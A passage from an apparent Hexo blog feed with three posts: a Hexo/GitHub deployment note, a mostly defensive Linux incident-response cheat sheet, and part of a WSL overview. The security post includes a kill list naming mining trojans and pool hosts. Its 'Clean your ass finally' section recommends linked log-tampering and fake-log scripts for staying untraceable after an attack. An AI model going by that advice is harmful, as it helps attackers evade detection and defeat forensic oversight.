<li>if not, generate by yourself<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;xx@xx.com&quot;</span></span><br><span class="line"><span class="comment"># &#x27;-t&#x27; have encryption method followed, and &#x27;rsa&#x27; can be replaced</span></span><br><span class="line"><span class="comment"># no need to bother other args </span></span><br></pre></td></tr></table></figure></li>
<li>type some password once, and you have a keypair now</li>
<li>then paste strings in <code>xxx.pub</code> to : <code>github</code> index -&gt; ur head portrait -&gt; Settings -&gt; SSH and GPG keys<br> and now you can login <code>github</code> without typing password in ssh or git bash</li>
</ul>
<ol start="4">
<li>configure hexo</li>
</ol>
<ul>
<li>in _config.yml (xxx&#x3D;&gt;<code>github</code> username):<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if only deploy to one repo</span></span><br><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: git</span><br><span class="line">   repo: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">   branch: master</span><br><span class="line"><span class="comment"># deploy to two or more repos</span></span><br><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: git</span><br><span class="line">   repo: </span><br><span class="line">    github: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">    gitlab: git@gitlab.com:xxx/xxx.gitlab.io.git</span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure></li>
<li>install plugin<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line"><span class="comment"># $ npm install hexo-generator-search  --save</span></span><br><span class="line">$ npm install hexo-generator-searchdb --save <span class="comment"># needed for my theme.</span></span><br></pre></td></tr></table></figure></li>
<li>deploy blog on github<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ hexo deploy </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ hexo -d</span><br></pre></td></tr></table></figure></li>
<li>sticky post<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-generator-index --save</span><br><span class="line">$ npm install hexo-generator-index-pin-top --save</span><br><span class="line"># add &#x27;top: true&#x27; in &#x27;Front-matter&#x27; to use it</span><br></pre></td></tr></table></figure>
<h3 id="Notes-for-Markdown-in-Hexo"><a href="#Notes-for-Markdown-in-Hexo" class="headerlink" title="Notes for Markdown in Hexo"></a>Notes for Markdown in Hexo</h3>Replace <code>&lt; &gt;</code>with <code>&amp;lt; &amp;gt;</code> &#x2F;&#x2F;maybe not necessary</li>
</ul>
<p>When using <code>{something...}</code>, add {% raw %} at the front and {% endraw %} as the tail,and finally it looks like <code>{% raw %}{something...}{% endraw %}</code>in your text to escape <code>&#123;</code> and<code>&#125;</code><br>but in the code block sorrounded by three `, you can input whatever u want.</p>
<p>As for multiple tags in hexo articles writing, use tags:[tag1, tag2, …]</p>
<p>image hosting<br><a class="link"   href="https://sm.ms/" >https://sm.ms/<i class="fas fa-external-link-alt"></i></a><br>tables generator<br><a class="link"   href="http://www.tablesgenerator.com/" >http://www.tablesgenerator.com/<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>hexo</tag>
        <tag>docker</tag>
        <tag>mysql</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Security Response</title>
    <url>/2019/05/07/2019-05-07-Linux-Security-Response/</url>
    <content><![CDATA[<p>Learn how to master Linux commands, the Security Response will be a good entry cz it involves many Linux commands related to user management, privilege control, and task monitoring which are useful when using Linux </p>
<h2 id="Linux-Reinforce"><a href="#Linux-Reinforce" class="headerlink" title="Linux Reinforce"></a>Linux Reinforce</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chattr +a xxx	--only appendable</span><br><span class="line">$ chattr +i xxx	--cannot be deleted</span><br><span class="line">$ touch /etc/nologin	--normal user cannot login</span><br><span class="line">$ vi /etc/ssh/sshd_config -&gt; banner NONE		--hide banner info</span><br><span class="line">$ authconfig --passalgo=sha512 --update	--replace md5 with SHA512</span><br><span class="line">$ auth required pam_tally2.so deny=3 unlock_time=5</span><br><span class="line">$ even_deny_root root_unlock_time=120		--<span class="built_in">limit</span> login <span class="built_in">times</span> (lock 2mins every 3 logins)</span><br><span class="line">$ vi /etc/profile -&gt; HISTSIZE=5 HISTFILESIZE=20</span><br></pre></td></tr></table></figure>

<h2 id="Security-Response"><a href="#Security-Response" class="headerlink" title="Security Response"></a>Security Response</h2><ul>
<li>PDCERF: Perparation, Detection, Containment, Eradication, Recovery, Follow-up</li>
<li>Confirm attacking time, IP address, and the evil file (process or rootkit) last</li>
</ul>
<h3 id="check-suspicious-users"><a href="#check-suspicious-users" class="headerlink" title="check suspicious users"></a>check suspicious users</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># search privileged users</span></span><br><span class="line">$ awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line">$ grep :0 /etc/passwd</span><br><span class="line"><span class="comment"># search users able to login remotely</span></span><br><span class="line">$ awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line"><span class="comment"># search users with sudo privilege</span></span><br><span class="line">$ more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line"><span class="comment"># disable or delete users</span></span><br><span class="line">    usermod -L user    unable to login</span><br><span class="line">    userdel user       delete user</span><br><span class="line">    userdel -r user    delete user and his homedir</span><br><span class="line"></span><br><span class="line"><span class="comment"># check new users</span></span><br><span class="line">$ less /etc/passwd</span><br><span class="line"><span class="comment"># check last time of modification</span></span><br><span class="line">$ ll -l /etc/passwd</span><br></pre></td></tr></table></figure>
<h3 id="port-and-process"><a href="#port-and-process" class="headerlink" title="port and process"></a>port and process</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># netstat used for port info</span></span><br><span class="line"><span class="comment"># ps used for process info</span></span><br><span class="line"><span class="comment"># lsof used for connection info between process and port</span></span><br><span class="line">$ netstat -antlp|more</span><br><span class="line">$ netstat -pantu|grep port</span><br><span class="line">$ ps aux[f]|grep pid</span><br><span class="line">$ ps -p port</span><br><span class="line">$ lsof [-i] |grep port</span><br><span class="line">$ lsof -i :port</span><br><span class="line">$ lsof -p pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># ss used for port info</span></span><br><span class="line"><span class="comment"># fuser used for process info</span></span><br><span class="line">$ ss [-t] |grep port</span><br><span class="line">$ ss -pantul</span><br><span class="line">$ sudo apt install psmisc   <span class="comment"># install fuser</span></span><br><span class="line">$ sudo fuser -v port/protocol <span class="comment"># like 80/tcp</span></span><br></pre></td></tr></table></figure>
<h3 id="startup-item-and-timed-tasks"><a href="#startup-item-and-timed-tasks" class="headerlink" title="startup item and timed tasks"></a>startup item and timed tasks</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more /etc/rc.local</span><br><span class="line">$ more /etc/rc.d/rc[0~6].d</span><br><span class="line"></span><br><span class="line">$ crontab -l 	<span class="comment"># list cron services</span></span><br><span class="line">$ crontab -e 	<span class="comment"># edit</span></span><br><span class="line">$ crontab -r 	<span class="comment"># remove</span></span><br><span class="line">/var/spool/cron/user 	default crontab filedir</span><br><span class="line"></span><br><span class="line">suspicious <span class="built_in">dirs</span>:</span><br><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br><span class="line">used to be:</span><br><span class="line">$ chkconfig --list</span><br><span class="line">$ chkconfig –-level  2345 httpd on/off</span><br><span class="line">now is:</span><br><span class="line">$ systemctl list-unit-files</span><br><span class="line">$ systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">$ systemctl <span class="built_in">disable</span> httpd</span><br></pre></td></tr></table></figure>
<h3 id="log-check"><a href="#log-check" class="headerlink" title="log check"></a>log check</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># locate IP which brute force root password:     </span></span><br><span class="line">$ journalctl -xa|grep <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">​</span><br><span class="line"><span class="comment"># similar to above:</span></span><br><span class="line">$ journalctl -xa|grep <span class="string">&quot;Failed password&quot;</span>|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br><span class="line">​</span><br><span class="line"><span class="comment"># brute force password dict is:</span></span><br><span class="line">$ grep <span class="string">&quot;Failed password&quot;</span> /var/<span class="built_in">log</span>/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line"><span class="comment"># success logins IP:   </span></span><br><span class="line">$ grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">​</span><br><span class="line"><span class="comment"># similar to above:</span></span><br><span class="line">$ grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>and as you can see, both &#x2F;var&#x2F;log&#x2F;auth.log(replace the &#x2F;vat&#x2F;log&#x2F;secure) and the command “journalctl -xa”, can be used to check logs</p>
<ul>
<li>add user log e.g.<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=user, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=user, UID=1001, GID=1001, home=/home/user</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> user</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/auth.log</span></span><br><span class="line">​```</span><br><span class="line">- delete user <span class="built_in">log</span> e.g.</span><br><span class="line">```bash</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="string">&#x27;user&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="string">&#x27;user&#x27;</span> owned by <span class="string">&#x27;user&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="string">&#x27;user&#x27;</span> owned by <span class="string">&#x27;user&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/auth.log</span></span><br><span class="line">​```</span><br><span class="line">- su switch user <span class="built_in">log</span> e.g.</span><br><span class="line">```bash</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span> user good by root(uid=0)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="view-hidden-processes"><a href="#view-hidden-processes" class="headerlink" title="view hidden processes"></a>view hidden processes</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ps -ef | awk<span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort -n| uniq &gt; tasklist1.txt</span><br><span class="line">$ ls /proc | sort -n | uniq &gt; tasklist2.txt</span><br><span class="line">$ diff tasklist1.txt tasklist2.txt</span><br></pre></td></tr></table></figure>

<h3 id="Commands-Summary"><a href="#Commands-Summary" class="headerlink" title="Commands Summary"></a>Commands Summary</h3><h2 id="Files-Recovery"><a href="#Files-Recovery" class="headerlink" title="Files Recovery"></a>Files Recovery</h2><p>if an important file were deleted, while a process which opens this file is alive, this process can still be read or written through it’s file descriptor.</p>
<p>e.g.</p>
<ul>
<li><p>see &#x2F;var&#x2F;log&#x2F;secure, only to find it was deleted<br><img src="/imghost/lsr/1.jpg" alt="pic 1"></p>
</li>
<li><p>use “lsof” to see process that opens it<br><img src="/imghost/lsr/2.jpg" alt="pic 2"></p>
</li>
<li><p>as we can see, pid is 1264, and fd (file descriptor) is 4. so we can find info in &#x2F;proc&#x2F;1264&#x2F;fd&#x2F;4<br><img src="/imghost/lsr/3.jpg" alt="pic 3"></p>
</li>
<li><p>use I&#x2F;O redirection to redirect it to file<br><img src="/imghost/lsr/4.jpg" alt="pic 4"></p>
</li>
<li><p>see &#x2F;var&#x2F;log&#x2F;secure, and now we recovered the deleted file<br><img src="/imghost/lsr/5.jpg" alt="pic 5"></p>
</li>
</ul>
<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>The <code>ext3grep</code> is to recovery file deleted by <code>rm - rf</code> on <code>ext3</code> disk.<br>First <code>unmount</code> that disk to stop writting, and then install <code>ext3grep</code>. You can find it in <code>apt</code> repo, or compile <a class="link"   href="https://code.google.com/archive/p/ext3grep/downloads" >it<i class="fas fa-external-link-alt"></i></a> on your own.</p>
<p>Installation:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install e2fslibs-dev</span><br><span class="line">$ tar xvf ext3grep-0.10.1.tar.gz </span><br><span class="line">$ <span class="built_in">cd</span> ext3grep-0.10.1</span><br><span class="line">$ ./configuremake &amp;&amp; make install</span><br></pre></td></tr></table></figure>
<p>Scan file name:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ext3grep /dev/sdbx --dump-names</span><br></pre></td></tr></table></figure>
<p>And recover all:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ext3grep /dev/sdbx --restore-all</span><br></pre></td></tr></table></figure>
<p>Or recover someone:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ext3grep /dev/sdbx --restore-file var/lib/mysql/aqsh/tb_b_attench.MYD</span><br></pre></td></tr></table></figure>
<p>Another tool is <code>extundelete</code>, you can install it through <code>apt</code> or get it on <a class="link"   href="https://sourceforge.net/projects/extundelete/files/extundelete/" >sourceforge<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Installation:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ wget http://nchc.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2 </span><br><span class="line">$ apt install e2fsprogs e2fslibs-dev build-essential </span><br><span class="line">$ tar -jxvf extundelete-0.2.4.tar.bz2 </span><br><span class="line">$ <span class="built_in">cd</span> extundelete-0.2.4 </span><br><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/extundelete </span><br><span class="line">$ make &amp;&amp; make install </span><br><span class="line"><span class="comment"># check installation</span></span><br><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/extundelete/bin </span><br><span class="line">$ ./extundelete -v </span><br></pre></td></tr></table></figure>

<p>The usage of it is similar to <code>ext3grep</code>, and it can recover by directory</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./extundelete --restore-file var/lib/mysql/aqsh/tb_b_attench.MYD /dev/sdbx  </span><br><span class="line">$ ./extundelete --restore-all /dev/sdbx </span><br><span class="line">$ date -d <span class="string">&quot;May 7 18:40 2019&quot;</span> +%s</span><br><span class="line">1557225600</span><br><span class="line">$ ./extundelete --restore-all --after <span class="string">&quot;1557225600&quot;</span> /dev/sdbx</span><br><span class="line"><span class="comment"># by directory</span></span><br><span class="line">$ extundelete /dev/sdbx --restore-directory var/lib/mysql/aqsh</span><br></pre></td></tr></table></figure>

<h2 id="Useful-Scripts"><a href="#Useful-Scripts" class="headerlink" title="Useful Scripts"></a>Useful Scripts</h2><h3 id="Normal"><a href="#Normal" class="headerlink" title="Normal"></a>Normal</h3><p>get <code>busybox</code> to analysis</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /bin/</span><br><span class="line">$ wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox</span><br><span class="line">$ chmod 755 busybox</span><br></pre></td></tr></table></figure>
<p>show malicious processes</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ perf top -s pid,comm,dso,symbol</span><br></pre></td></tr></table></figure>
<p>delete ddos trojans or mining scripts, can be used directly(from a SRC event)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps auxf | grep -v grep | grep hwlh3wlh44lh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep Circle_MI | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep get.bi-chi.com | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep hashvault.pro | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep nanopool.org | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep /usr/bin/.sshd | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;xmr&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;xig&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;ddgs&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;qW3xT&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;wnTKYg&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;t00ls.ru&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;sustes&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;thisxxs&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;hashfish&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br><span class="line">ps auxf|grep -v grep|grep <span class="string">&quot;kworkerds&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>

<p>Operations related:</p>
<p>find zombie process</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ps -ef | grep defunct</span><br></pre></td></tr></table></figure>

<p>count</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># simply use the top to see things like ...</span></span><br><span class="line">...</span><br><span class="line">Tasks:   4 total,   1 running,   3 sleeping,   0 stopped,   0 zombie</span><br><span class="line">...</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">ps -ef | grep defunct | grep -v grep | wc -l</span><br></pre></td></tr></table></figure>

<p>kill zombie process</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ps -e -o ppid,<span class="built_in">stat</span> | grep Z | cut –d<span class="string">&quot; &quot;</span> -f2 | xargs <span class="built_in">kill</span> -9</span><br><span class="line">$ <span class="built_in">kill</span> -HUP `ps -A -ostat,ppid | grep -e <span class="string">&#x27;^[Zz]&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br></pre></td></tr></table></figure>


<h3 id="Tide-sec-team’s-auto-script-in-Chinese"><a href="#Tide-sec-team’s-auto-script-in-Chinese" class="headerlink" title="Tide sec team’s auto script( in Chinese)"></a>Tide sec team’s auto script( in Chinese)</h3><p>It is an automatic script written in pithon2, and is useful in linux security response.<br>It gather system information and service log, then generate a log file to save results.<br>This script can be found <a href="/filehost/lsr/tidesec.py">Here</a></p>
<h3 id="A-miner-cleaner"><a href="#A-miner-cleaner" class="headerlink" title="A miner cleaner"></a>A miner cleaner</h3><p>This was extracted from a mining trojan, to get rid of every competitors on the victim.<br>Get it <a href="/filehost/lsr/minecleaner.sh">Here</a> to clear mainstream mining trojans.</p>
<h3 id="Clean-your-ass-finally"><a href="#Clean-your-ass-finally" class="headerlink" title="Clean your ass finally"></a>Clean your ass finally</h3><p>After the attack, you better get your ass cleaned to be untraceable.<br>We have a simple cleaner <a href="/filehost/lsr/logtamper.py">Here</a>. Another better script is <a href="/filehost/lsr/fake_login_log.py">Here</a> in Chinese, which could even fake log info.</p>
<h2 id="Key-Files"><a href="#Key-Files" class="headerlink" title="Key Files"></a>Key Files</h2><p>“Key” here means important</p>
<p>Use <code>lsattr</code> to see hidden attribution</p>
<ul>
<li>About hidden attribution<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-a 　show all files and directories including  .(current dir) and ..(parent dir)</span><br><span class="line">-d 　show <span class="built_in">dirs</span><span class="string">&#x27; names</span></span><br><span class="line"><span class="string">-l 　just list</span></span><br><span class="line"><span class="string">-R 　Recursive processing, which processes all files and subdirectories in the specified directory together.</span></span><br><span class="line"><span class="string">-v 　show versions of files and dirs</span></span><br><span class="line"><span class="string">-V 　show versions</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
Use <code>getfacl</code> to see things about ACL (Access Control List)</li>
<li>About ACL attribution<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a, --access: only displays file access control lists</span><br><span class="line">-d, --default: only displays the default access control list</span><br><span class="line">-c, --omit-header: not display comment headers</span><br><span class="line">-e, --all-effective: show all valid permissions</span><br><span class="line">-E, --no-effective: show invalid permissions</span><br><span class="line">-s, --skip-base: skip files with only base entries</span><br><span class="line">-R, --recursive: recursively display subdirs</span><br><span class="line">-L, --logical: logical traversal (follow the symbolic link)</span><br><span class="line">-P, --physical: physical traversal (does not follow symbolic links)</span><br><span class="line">-t, --tabular: Use tab-delimited output format</span><br><span class="line">-n, --numeric: show the user/group ID of the number</span><br><span class="line">-p, --absolute-names: not remove the <span class="string">&#x27;/&#x27;</span> symbol before the path</span><br><span class="line">-v, --version: display version and <span class="built_in">exit</span></span><br><span class="line">-h, --<span class="built_in">help</span>: display this <span class="built_in">help</span> information</span><br></pre></td></tr></table></figure>
<h2 id="Tools-1"><a href="#Tools-1" class="headerlink" title="Tools"></a>Tools</h2></li>
</ul>
<ul>
<li>chkrootkit<br>later…</li>
<li>rkhunter<br>later…</li>
<li>clamav<br>later…</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security-response</tag>
      </tags>
  </entry>
  <entry>
    <title>Try and Use WSL</title>
    <url>/2019/08/01/2019-08-01-Try-and-Use-WSL/</url>
    <content><![CDATA[<p>After a medium period of working &amp; studying on Deepin Linux, I experienced the force of deepin technology community including well technology supports, and commercial softwares <del>(cracked)</del>  provided, but there are still things I have to do on Windows only, like Office and my poor amd graphics card’s outdated driver, which cannot be installed on new Linux distributions.</p>
<p>By the way I want to start studying  Windows OS, so initially planned to experience WSL, Hyper-v, Windows sandbox, Virtual Machine Platform, IIS and other Windows featured functions in order. It’s proved to be a <del>hard</del> long way.</p>
<h2 id="Windows-Subsystem-for-Linux"><a href="#Windows-Subsystem-for-Linux" class="headerlink" title="Windows Subsystem for Linux"></a>Windows Subsystem for Linux</h2><p>So why WSL?<br>Cygwin, Gow, MSYS2, Git bash and other UNIX-like terminals are suitable for users with Linux cmd habits, but on WSL, you can almost do whatever Linux developers can do. It obeys your Linux developing custom, allows you to run Linux softwares (ELF files), and boots up really fast and so on. But only supported on Win10.<br>Here is its Architecture</p>
<p><img src="/imghost/tuw/1.png" alt="pic 1 Architecture"></p>
<p>If you want to know more such as how to install, basic usages, and other stuff, please click <a class="link"   href="https://docs.microsoft.com/en-us/windows/wsl/about" >Official documents<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="WSL"><a href="#WSL" class="headerlink" title="WSL"></a>WSL</h3><p>WSL is a collection of components that enables native Linux ELF64 binaries to run on Windows. It contains both user mode and kernel mode components. It is primarily comprised of:</p>
<ul>
<li>User mode session manager service that handles the Linux instance life cycle</li>
<li>Pico provider drivers (lxss.sys, lxcore.sys) that emulate a Linux kernel by translating Linux syscalls</li>
<li>Pico processes that host the unmodified user mode Linux (e.g. &#x2F;bin&#x2F;bash)</li>
</ul>
<p>It is the space between the user mode Linux binaries and the Windows kernel components where the magic happens. By placing unmodified Linux binaries in Pico processes we enable Linux system calls to be directed into the Windows kernel. The lxss.sys and lxcore.sys drivers translate the Linux system calls into NT APIs and emulate the Linux kernel.</p>
<p><img src="/imghost/tuw/2.jpg" alt="pic 2 Architecture"></p>
<p>Now we can see the subsystem does not contain a real Linux Kernel, but it can satisfied lots of users.</p>
<p>Pros:</p>
<ul>
<li>fast bootup, much faster than VirtualMachine in VM and Vbox</li>
<li>almost perfect Linux Architecture simulation, and ELF support which means possible and convenient for running &amp; debugging ELF files when using Windows</li>
<li>wsl’s linux file system can be directly browsed and accessed on Windows, though it’s not recommended, may be harmful. All files in rootfs directory :)</li>
<li>same network configuration as host Windows, use 127.0.0.1 to access files on wsl server</li>
</ul>
<p>Cons:</p>
<ul>
<li>no raw_socket using, which leads to many network-softwares (using socket) invalid</li>
<li>some functions like systemd are also invalid</li>
</ul>
<p>Outlook:from official<br>What will happen to WSL 1? Will it be abandoned?<br>We currently have no plans to deprecate WSL 1. You can run WSL 1 and WSL 2 distros side by side, and can upgrade and downgrade any distro at any time. Adding WSL 2 as a new architecture presents a better platform for the WSL team to deliver features that make WSL an amazing way to run a Linux environment in Windows.</p>
<h3 id="WSL2"><a href="#WSL2" class="headerlink" title="WSL2"></a>WSL2</h3><p>WSL 2 is a new version of the architecture that powers the Windows Subsystem for Linux to run ELF64 Linux binaries on Windows. This new architecture changes how these Linux binaries interact with Windows and your computer’s hardware, but still provides the same user experience as in WSL 1 (the current widely available version). Individual Linux distros can be run either as a WSL 1 distro, or as a WSL 2 distro, can be upgraded or downgraded at any time, and you can run WSL 1 and WSL 2 distros side by side. WSL 2 uses an entirely new architecture that uses a real Linux kernel.</p>
<p><a class="link"   href="https://devblogs.microsoft.com/commandline/announcing-wsl-2/" >Announcing WSL 2<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://devblogs.microsoft.com/commandline/wsl-2-is-now-available-in-windows-insiders/" >WSL 2 is now available in Windows Insiders<i class="fas fa-external-link-alt"></i></a></p>
<p>If you want to know more such as how to install, basic usages, and other stuff, please click <a class="link"   href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-index" >Official documents<i class="fas fa-external-link-alt"></i></a></p>
<p>WSL2 requires Insider Preview. And this time, after reading all above, we know WSL2 is really based on Hyper-v.</p>
<p>Pros:</p>
<ul>
<li>A more realistic Linux with systemd now and raw_socket allowed (maybe all this thanks to Hyper-v)</li>
<li>High levels of integration between Windows and Linux, extremely fast boot times, small resource footprint, and best of all will require no VM configuration or management</li>
</ul>
<p>Cons:</p>
<ul>
<li>Hyper-v means no other VMs except VirtualBox for 32 bits vm images as is said (test 64 bits vm images and NO)</li>
<li>NAT network mode cannot be changed now, which means cut the network setting part of this “faster Hyper-v”, and somehow it becomes bit of inconvenient</li>
<li>no direct browse or access to linux file system, because original roofs dir is replaced by the vm format file : ext4.vhdx. Still can use explorer.exe to open it</li>
</ul>
<p>Outlook:<br>The networking applications part and hardware support will be improved. Let’s look forward to it.<br>But WSL seems to be mor useful than WSL2</p>
<h3 id="Usages"><a href="#Usages" class="headerlink" title="Usages"></a>Usages</h3><p>The whole docs are on <a class="link"   href="https://docs.microsoft.com/en-us/windows/wsl/" >Windows Subsystem for Linux Documentation<i class="fas fa-external-link-alt"></i></a>.</p>
<p>First visit <a class="link"   href="https://docs.microsoft.com/en-us/windows/wsl/install-win10" >Windows Subsystem for Linux Installation Guide for Windows 10<i class="fas fa-external-link-alt"></i></a> to know how to install</p>
